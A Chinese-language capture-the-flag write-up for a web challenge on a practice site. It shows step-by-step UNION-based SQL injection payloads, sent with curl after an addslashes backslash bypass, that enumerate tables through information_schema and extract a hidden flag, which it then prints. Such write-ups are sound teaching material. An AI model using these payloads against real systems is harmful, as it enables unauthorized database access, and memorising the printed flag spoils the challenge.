# PHM #22 Web — login as admin 0.1

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 30 |

## 題目

> Try harder — hidden flag in database.
>
> 連結: [`/login0.1/`](https://ctf.hackme.quest/login0.1/)

## 分析

跟 #21 同套 source (addslashes bypass via backslash). 但 `$flag` 是 PHP 常數, 真正的 flag 藏在 DB 一個隱藏表. Hint 說 `hidden flag`, 要用 **UNION-based SQLi** 把它撈出來.

資料流:
1. UNION select 補到 `users` 的欄位數 (測試得知 4 cols)
2. 用 `information_schema` 找 `database()` 底下的 table 名稱
3. 找到 `h1dden_f14g` 表, 欄位 `the_f14g`
4. UNION SELECT 把 `the_f14g` 塞進回傳的 `name` 位置顯示

## 解法

```bash
# 1. 找欄位數 (順序試 2,3,4,5...)
curl 'https://ctf.hackme.quest/login0.1/' \
  --data-urlencode 'name=admin\' \
  --data-urlencode 'password=UNION SELECT 1,2,3,4#'
# → 4 cols 時成功顯示

# 2. 撈 table
curl 'https://ctf.hackme.quest/login0.1/' \
  --data-urlencode 'name=admin\' \
  --data-urlencode 'password=UNION SELECT GROUP_CONCAT(table_name),2,3,4 FROM information_schema.tables WHERE table_schema=database()#'
# → users, h1dden_f14g

# 3. 撈 column
curl ... \
  --data-urlencode 'password=UNION SELECT GROUP_CONCAT(column_name),2,3,4 FROM information_schema.columns WHERE table_name="h1dden_f14g"#'
# → the_f14g

# 4. 撈 flag
curl ... \
  --data-urlencode 'password=UNION SELECT the_f14g,2,3,4 FROM h1dden_f14g#'
```

## Flag

```
FLAG{Good, Union select is quite easy to exploit!}
```

## 感想

PHM 的 UNION 系列入門. 關鍵: 當 flag 不是 PHP 變數而是 DB 資料, UNION select 可以**把任意欄位塞進回傳行的任意位置顯示**. `information_schema` 是 MySQL 自帶的 metadata DB, 永遠可以用來 enumerate schema.
